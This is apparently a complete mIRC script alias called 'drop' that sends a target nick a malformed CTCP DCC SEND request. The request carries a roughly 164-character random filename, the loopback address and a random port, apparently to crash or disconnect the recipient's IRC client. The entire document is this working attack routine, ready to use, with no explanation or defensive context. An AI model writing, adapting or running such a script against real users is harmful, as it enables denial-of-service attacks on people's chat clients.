alias drop {
  var %packet = $rand(a,z)
  set %i 1
  while ($len(%packet) < 164) {
    var %packet = %packet $+ $chr(32) $+ $rand(a,z)
    inc %i
  }
  raw PRIVMSG $1 $chr(58) $+ $chr(1) $+ DCC SEND $+ $chr(32) $+ $chr(34) $+ %packet $+ $chr(34) $+ $chr(32) $+ 2130706433 $+ $chr(32) $+ $rand(1024,65535) $+ $chr(32) $+ $len(%packet) $+ $chr(1)
}